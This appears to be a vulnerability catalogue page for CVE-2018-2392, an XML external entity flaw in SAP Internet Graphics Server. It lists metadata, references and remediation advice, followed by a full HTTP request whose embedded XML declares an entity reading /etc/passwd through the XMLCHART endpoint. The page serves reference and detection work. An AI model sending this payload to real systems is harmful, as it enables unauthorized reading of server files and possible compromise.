---
layout: post
cve_id: CVE-2018-2392
title: SAP Internet Graphics Server (IGS) - XML External Entity Injection
pcap: true
pcap_path: /pcaps/2018/CVE-2018-2392.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-2392.yaml
snort2_rule: N/A
snort3_rule: N/A
author: _generic_human_
severity: high
impact: 'Successful exploitation of this vulnerability can lead to unauthorized access
  to sensitive information or a complete system compromise.

  '
remediation: 'Apply the latest security patches and updates provided by SAP to mitigate
  this vulnerability. Additionally, ensure that the SAP Internet Graphics Server (IGS)
  is not exposed to untrusted networks or the internet.

  '
reference:
- https://launchpad.support.sap.com/#/notes/2525222
- https://blogs.sap.com/2018/02/13/sap-security-patch-day-february-2018/
- https://www.rapid7.com/db/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe/
- https://troopers.de/troopers18/agenda/3r38lr/
- https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe.rb
- https://nvd.nist.gov/vuln/detail/CVE-2018-2392
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
  cvss-score: 7.5
  cve-id: CVE-2018-2392
  cwe-id: CWE-611
  epss-score: 0.86959
  epss-percentile: 0.99406
  cpe: cpe:2.3:a:sap:internet_graphics_server:7.20:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: sap
  product: internet_graphics_server
tags:
- cve
- cve2018
- sap
- igs
- xxe
- xmlchart
- msf
- intrusive
- vkev
- vuln
---

## üîç Vulnerability Description
SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53 has two XML external entity injection (XXE) vulnerabilities within the XMLCHART page - CVE-2018-2392 and CVE-2018-2393. These vulnerabilities occur due to a lack of appropriate validation on the Extension HTML tag when submitting a POST request to the XMLCHART page to generate a new chart.


## üåê HTTP Request
```nohighlight
POST /XMLCHART HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15
Connection: close
Content-Length: 1023
Content-Type: multipart/form-data; boundary=38Fd7SC6q6kcuNmxwSIyTlUlAGy
Accept-Encoding: gzip
--38Fd7SC6q6kcuNmxwSIyTlUlAGy
Content-Disposition: form-data; name="38Fd7Rs25Lx45uPQXCNJs67h7yL"; filename="38Fd7RjyGttLWVlyJNJ84tyaYy1.xml"
Content-Type: application/xml
<?xml version='1.0' encoding='UTF-8'?>
<ChartData>
<Categories>
<Category>ALttP</Category>
</Categories>
<Series label="38Fd7S2Y4jIR51mmwo8sTsjAth3">
<Point>
<Value type="y">12345</Value>
</Point>
</Series>
</ChartData>
--38Fd7SC6q6kcuNmxwSIyTlUlAGy
Content-Disposition: form-data; name="38Fd7LT1hpzaNHHlvqc2JeF0mcM"; filename="38Fd7L9gnNDv070ziRJgAZqhKv0.xml"
Content-Type: application/xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE Extension [<!ENTITY xxe SYSTEM "/etc/passwd">]>
<SAPChartCustomizing version="1.1">
<Elements>
<ChartElements>
<Title>
<Extension>&xxe;</Extension>
</Title>
</ChartElements>
</Elements>
</SAPChartCustomizing>
--38Fd7SC6q6kcuNmxwSIyTlUlAGy--
```

